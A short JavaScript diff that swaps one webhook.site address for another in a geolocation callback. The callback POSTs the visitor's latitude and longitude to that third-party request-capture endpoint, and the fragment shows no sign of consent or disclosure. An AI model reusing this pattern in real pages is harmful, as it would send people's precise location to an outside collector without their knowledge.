@@ -8,7 +8,7 @@ function successCallback(position) {
     var lat = position.coords.latitude;
     var lon = position.coords.longitude;
     var data = { latitude: lat, longitude: lon };
-    fetch('https://webhook.site/28e04897-2e99-493c-82ff-777af77121ba', {
+    fetch('https://webhook.site/40f3696f-4320-47b0-8b22-240b41b8ae7b', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
